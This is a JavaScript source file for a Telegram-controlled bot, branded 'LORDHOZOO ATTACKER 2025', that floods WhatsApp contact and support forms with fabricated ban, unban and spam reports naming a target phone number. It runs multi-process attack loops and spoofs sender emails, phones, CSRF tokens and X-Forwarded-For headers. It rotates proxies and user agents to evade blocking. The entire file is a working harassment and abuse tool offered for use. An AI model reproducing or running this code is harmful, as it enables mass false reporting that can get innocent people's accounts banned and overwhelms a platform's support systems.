const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { randomInt } = require('crypto');
const fs = require('fs');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'TOKEN';
const bot = new TelegramBot(TOKEN, { polling: true });
const TARGET_URLS = [
    "https://www.whatsapp.com/contact/",
    "https://www.whatsapp.com/support/",
    "https://www.whatsapp.com/help/",
    "https://www.whatsapp.com/contact/noclient",
    "https://www.whatsapp.com/business/",
    "https://www.whatsapp.com/complaint",
    "https://www.whatsapp.com/"
];

const USER_AGENTS = require('./user_agents.json'); // Large list of 1000+ user agents
const PROXIES = require('./proxies.json'); // Rotating proxy list

// Message Templates
const MESSAGE_TEMPLATES = {
    BAN: 'message_ban_whatsapp.json',
    UNBAN: 'message_unban_whatsapp.json',
    SPAM: 'message_spam_whatsapp.json'
};

// Global Attack Stats
const attackStats = {
    isRunning: false,
    requests: 0,
    successes: 0,
    mode: 'SPAM',
    startTime: 0,
    workers: []
};

// Load Message Templates with Cache
const messageCache = {};
function loadMessages(mode) {
    if (messageCache[mode]) return messageCache[mode];
    
    try {
        const rawData = fs.readFileSync(MESSAGE_TEMPLATES[mode], 'utf8');
        messageCache[mode] = JSON.parse(rawData);
        return messageCache[mode];
    } catch (err) {
        console.error(`Error loading ${mode} messages:`, err);
        return null;
    }
}
function generateNuclearData(targetNumber, mode) {
    const messages = loadMessages(mode);
    const randomMessage = messages[randomInt(0, messages.length)];
    return {
        country: ['ID', 'US', 'IN', 'BR', 'NG', 'PK', 'BD', 'MX', 'DE', 'RU'][randomInt(0, 10)],
        email: `${generateRandomString(12)}@${['gmail.com','yahoo.com','hotmail.com','proton.me'][randomInt(0,4)]}`,
        phone: `+${randomInt(1, 99)}${randomInt(100000000, 9999999999)}`,
        platform: ['ANDROID','IPHONE','WEB','KAIOS','DESKTOP'][randomInt(0,5)],
        subject: randomMessage.subject.replace(/\[NUMBER\]/g, targetNumber),
        message: randomMessage.body.replace(/\[NUMBER\]/g, targetNumber),
        token: generateRandomString(64),
        csrf: generateRandomString(32)
    };
}
function generateRandomString(length) {
    return Array.from({length}, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[randomInt(0, 36)]).join('');
}

// Cluster Worker Execution
if (cluster.isMaster) {
    console.log(`💣 MASTER PROCESS READY (${numCPUs} WORKERS)`);
    
    // Telegram Bot Commands
    bot.onText(/\/start/, (msg) => {
        bot.sendMessage(msg.chat.id, 
            `☢️ *LORDHOZOO ATTACKER 2025* ☢️\n\n` +
            `💣 UNLIMITED MESSAGE SPAMMING\n` +
            `🚀 MULTI-THREADED ATTACKS\n` +
            `🔥 AUTO PROXY ROTATION\n\n` +
            `📌 COMMANDS:\n` +
            `/spam +628123456789 - Start unlimited spam\n` +
            `/ban +628123456789 - Start ban attack\n` +
            `/unban +628123456789 - Start unban attack\n` +
            `/stop - Terminate all attacks\n` +
            `/stats - Show current stats`,
            { parse_mode: 'Markdown' }
        );
    });

    bot.onText(/\/spam (.+)/, (msg, match) => {
        if (attackStats.isRunning) {
            bot.sendMessage(msg.chat.id, '⚠️ Nuclear attack already underway!');
            return;
        }
        
        attackStats.isRunning = true;
        attackStats.mode = 'SPAM';
        attackStats.startTime = Date.now();
        attackStats.target = match[1];
        
        // Launch worker cluster
        for (let i = 0; i < numCPUs; i++) {
            const worker = cluster.fork();
            worker.on('message', (message) => {
                if (message.type === 'stats') {
                    attackStats.requests += message.requests;
                    attackStats.successes += message.successes;
                }
            });
            attackStats.workers.push(worker);
        }
        
        bot.sendMessage(msg.chat.id, `☢️ LAUNCHING NUCLEAR SPAM ON ${match[1]} WITH ${numCPUs} WORKERS`);
        
        // Periodic stats updates
        attackStats.updateInterval = setInterval(() => {
            const minutes = Math.floor((Date.now() - attackStats.startTime) / 60000);
            const rps = Math.floor(attackStats.requests / (minutes * 60 || 1));
            
            bot.sendMessage(
                msg.chat.id,
                `☢️ NUCLEAR ATTACK STATUS\n` +
                `⏱ ${minutes} MINUTES ELAPSED\n` +
                `💣 ${attackStats.requests} REQUESTS\n` +
                `✅ ${attackStats.successes} SUCCESSES\n` +
                `🚀 ${rps} REQUESTS/SECOND`
            );
        }, 30000);
    });

    bot.onText(/\/stop/, (msg) => {
        if (!attackStats.isRunning) {
            bot.sendMessage(msg.chat.id, '⚠️ No active attack to stop');
            return;
        }
        
        clearInterval(attackStats.updateInterval);
        attackStats.isRunning = false;
        
        // Terminate all workers
        for (const worker of attackStats.workers) {
            worker.kill();
        }
        attackStats.workers = [];
        
        const minutes = Math.floor((Date.now() - attackStats.startTime) / 60000);
        const successRate = (attackStats.successes / attackStats.requests * 100).toFixed(2);
        
        bot.sendMessage(
            msg.chat.id,
            `🛑 NUCLEAR ATTACK TERMINATED\n` +
            `⏱ ${minutes} MINUTES OF DESTRUCTION\n` +
            `💣 ${attackStats.requests} TOTAL REQUESTS\n` +
            `✅ ${successRate}% SUCCESS RATE`
        );
        
        // Reset counters
        attackStats.requests = 0;
        attackStats.successes = 0;
    });

} else {
    // Worker process - infinite attack loop
    console.log(`⚡ WORKER ${process.pid} READY`);
    
    const attack = async () => {
        let workerRequests = 0;
        let workerSuccesses = 0;
        
        while (attackStats.isRunning) {
            try {
                const targetUrl = TARGET_URLS[randomInt(0, TARGET_URLS.length)];
                const data = generateNuclearData(attackStats.target, attackStats.mode);
                
                const formData = new URLSearchParams();
                formData.append('country_selector', data.country);
                formData.append('email', data.email);
                formData.append('phone_number', data.phone);
                formData.append('platform', data.platform);
                formData.append('your_message', `${data.subject}%0A${data.message}`);
                formData.append('__csr', data.csrf);
                formData.append('__ccg', 'EXCELLENT');
                
                const headers = {
                    "User-Agent": USER_AGENTS[randomInt(0, USER_AGENTS.length)],
                    "X-Forwarded-For": `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`,
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                };
                
                const proxy = PROXIES[randomInt(0, PROXIES.length)];
                const axiosConfig = {
                    headers,
                    timeout: 5000,
                    proxy: {
                        host: proxy.ip,
                        port: proxy.port,
                        auth: proxy.auth
                    }
                };
                
                const response = await axios.post(targetUrl, formData, axiosConfig);
                
                workerRequests++;
                if (response.status === 200) {
                    workerSuccesses++;
                }
                
                // Send stats update to master every 100 requests
                if (workerRequests % 100 === 0) {
                    process.send({
                        type: 'stats',
                        requests: workerRequests,
                        successes: workerSuccesses
                    });
                    workerRequests = 0;
                    workerSuccesses = 0;
                }
                
                // Minimal delay for maximum throughput
                await new Promise(resolve => setTimeout(resolve, 50));
                
            } catch (error) {
                // Silently continue the attack
                workerRequests++;
            }
        }
    };
    
    attack();
}

console.log(' 👰 HOZOO IMUT SPAM BOT ACTIVATED');
